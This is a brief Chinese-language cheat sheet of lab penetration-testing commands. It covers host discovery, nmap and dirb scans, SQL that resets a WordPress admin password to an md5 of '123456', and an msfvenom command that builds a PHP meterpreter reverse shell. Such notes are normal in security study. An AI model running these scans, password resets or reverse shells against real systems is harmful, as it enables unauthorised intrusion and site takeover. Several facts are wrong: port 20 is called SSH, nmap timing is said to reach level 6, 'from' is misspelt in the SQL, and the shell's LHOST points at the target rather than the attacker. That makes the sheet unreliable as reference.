### 我的系统
+ Kali 靶机IP 192.168.18.128
+ Win7 192.168.18.129
+ Wordpress 192.168.18.131

## 常用命令
+ 扫描IP
    + arp-scan -l 
    + netdiscover 
    + fping

+ 端口扫描
    + nmap -sS -sV -p- -v -T4 靶场ip
        + -A 详细扫描目标ip
        + -v 显示详细的扫描过程
        + -sS TCP SYN 扫描
        + -sV 服务版本扫描
        + -p- 扫描全部端口 = -p 1-65535
        + -T4 级别越高速度越快，最高为6级
    + 常见端口
        + 20 SSH服务
        + 80 HTTP服务
        + 3306 MySQL服务
+ 目录扫描
    + dirb http://地址
    + dirbuster 图形界面

+ sql查找
    + select * form 'wp_users'
    + update wp_users set user_pass=md5("123456") where user_login = 'admin'

+ shell
    + 利用msf成成反弹shell msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.18.131 LPORT=4444 -o Desktop/shell.php

+ kali
    + ctrl c 强制结束
    + apt-get update 升级系统包 apt-get update && apt-get upgrade


